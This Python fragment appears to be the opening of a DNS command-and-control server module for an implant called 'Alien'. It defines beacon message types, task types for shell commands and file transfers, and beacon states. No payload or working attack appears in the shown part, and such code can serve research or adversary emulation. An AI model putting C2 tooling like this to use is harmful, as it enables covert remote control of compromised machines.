import logging
import socket
import zlib
from enum import IntEnum

from Alien.utilities.communication import BeaconResponse, BeaconResult, ResultCodes
from Alien.utilities.encodings import (
    CHARACTER_SET,
    bruteforce_base32,
    decode_possibly_padded_str_into_int,
    determine_shuffled_alphabet_from_seed,
    encode_int_into_str,
)

logger = logging.getLogger("dns_c2")

class MessageTypes(IntEnum):
    first_alive = 0
    send = 1
    receive = 2
    send_and_receive = 3
    main_alive = 4

class TaskTypes(IntEnum):
    static = 43
    cmd = 70
    compressed_cmd = 71
    file = 95
    compressed_file = 96

class BeaconStates(IntEnum):
    firstalive_done = 0
    payloadsize_sent = 1
    pending_commandresult = 2
    receiving_commandresult = 3
    sleeping = 4


CODE_FOR_ZLIB_DEFLATED_OUTPUT = 61

MESSAGETYPE_FOR_BEACON_STATE = {
    BeaconStates.firstalive_done: None,
    BeaconStates.payloadsize_sent: MessageTypes.receive,
    BeaconStates.pending_commandresult: MessageTypes.send,
    BeaconStates.receiving_commandresult: MessageTypes.send,
}
